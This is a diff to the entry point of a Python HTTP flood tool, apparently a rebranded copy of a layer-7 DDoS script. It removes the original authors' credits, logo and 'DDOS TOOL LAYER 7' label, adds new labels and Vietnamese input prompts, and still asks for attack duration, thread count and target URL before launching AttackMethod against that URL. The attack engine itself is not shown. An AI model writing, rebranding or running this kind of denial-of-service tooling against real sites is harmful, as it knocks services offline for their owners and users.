@@ -1,6 +1,3 @@
-# -*- coding: utf-8 -*-
-
-# Created by nuvem and tsk
 
 import os
 import sys
@@ -26,26 +23,17 @@ except ImportError as err:
 if __name__ == "__main__":
 
     logo = """
-  ▒█████   ██▒   █▓▓█████  ██▀███   ██▓     ▒█████   ▄▄▄      ▓█████▄ 
-  ▒██▒  ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
-  ▒██░  ██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
-  ▒██   ██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
-  ░ ████▓▒░   ▒▀█░  ░▒████▒░██▓ ▒██▒░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
-  ░ ▒░▒░▒░    ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
-    ░ ▒ ▒░    ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
-  ░ ░ ░ ▒       ░░     ░     ░░   ░   ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
-      ░ ░        ░     ░  ░   ░         ░  ░    ░ ░        ░  ░   ░    
-                ░                                               ░     
+  SUS
   """
 
     CRED2 = "\33[91m"
     print(CRED2 + logo + CRED2)
-    print("├───DDOS TOOL LAYER 7")
+    print("Byass Super. ")
 
     try:
-        time = int(input(f"{Fore.RED}│   ├───TIME: {Fore.RESET}"))
-        threads = int(input(f"{Fore.RED}│   └───THREADS: {Fore.RESET}"))
-        target = str(input(f"{Fore.RED}│   └───URL: {Fore.RESET}"))
+        time = int(input(f"{Fore.RED}│   Thoi Gian: {Fore.RESET}"))
+        threads = int(input(f"{Fore.RED}│   Thread: {Fore.RESET}"))
+        target = str(input(f"{Fore.RED}│   Link: {Fore.RESET}"))
 
         with AttackMethod(
             duration=time, method_name="HTTP", threads=threads, target=target
